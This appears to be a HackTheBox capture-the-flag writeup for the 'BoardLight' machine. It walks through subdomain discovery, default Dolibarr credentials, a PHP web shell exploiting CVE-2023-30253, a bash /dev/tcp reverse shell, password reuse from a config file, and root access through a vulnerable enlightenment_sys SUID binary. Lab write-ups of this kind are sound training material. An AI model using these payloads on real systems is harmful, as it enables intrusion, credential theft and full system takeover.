---
title: "HTB BoardLight — Writeup"
type: writeup
tags: HackTheBox, Linux, Dolibarr, CVE-2023-30253, SUID
excerpt: Easy Linux box. Initial access via Dolibarr ERP CVE, privesc via vulnerable SUID enlightenment_sys binary.
---

# HTB BoardLight — Writeup

**Difficulty:** Easy
**OS:** Linux
**Release:** 2024-05-11

---

## Recon

Start with a port scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.11.11
```

```
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache httpd 2.4.41
```

The web server at port 80 shows a corporate landing page for "BoardLight". Nothing interesting in the visible content, but subdomain enumeration finds something:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://board.htb/ -H "Host: FUZZ.board.htb" -fs 15949
```

```
crm     [Status: 200, Size: 6360]
```

---

## Initial Access — Dolibarr ERP (CVE-2023-30253)

The subdomain `crm.board.htb` runs **Dolibarr ERP 17.0.0**. Default credentials work:

```
admin:admin
```

Dolibarr 17.0.0 is vulnerable to **CVE-2023-30253**, a PHP code injection via the website module. The CMS page editor allows creating `.php` files but tries to block `<?php` tags. The bypass is trivial — use `<?PHP` (uppercase):

```php
<?PHP system($_GET['cmd']); ?>
```

Create a new website, add a page, inject the payload in the page template, then request it:

```
http://crm.board.htb/htdocs/public/website/index.php?website=test&pageref=shell&cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a reverse shell:

```bash
# Listener
nc -lvnp 4444

# Payload (URL encoded)
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

---

## Lateral Movement — User

Enumerate the Dolibarr config:

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

```php
$dolibarr_main_db_pass='ServicesHubADM!';
```

Try the password for the local users:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
# larissa:x:1000:1000::/home/larissa:/bin/bash

su - larissa   # password: ServicesHubADM!
```

Grab `user.txt`.

---

## Privilege Escalation — enlightenment_sys SUID

Look for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

The installed version of the `enlightenment` window manager is vulnerable to a local privilege escalation via `enlightenment_sys`. The binary takes a path argument and passes it to `mount` as root without proper sanitization.

```bash
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \
  /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \
  "/dev/../tmp/;/tmp/exploit"
```

Where `/tmp/exploit` is:

```bash
#!/bin/bash
chmod +s /bin/bash
```

After execution:

```bash
/bin/bash -p
# bash-5.0# id
# uid=1000(larissa) gid=1000(larissa) euid=0(root) egid=0(root)
```

Grab `root.txt`.

---

## Summary

| Step | Technique |
|---|---|
| Recon | Subdomain enumeration → `crm.board.htb` |
| Initial access | Dolibarr default creds + CVE-2023-30253 PHP injection |
| Lateral movement | Password reuse from Dolibarr config |
| Privesc | Vulnerable SUID `enlightenment_sys` binary |
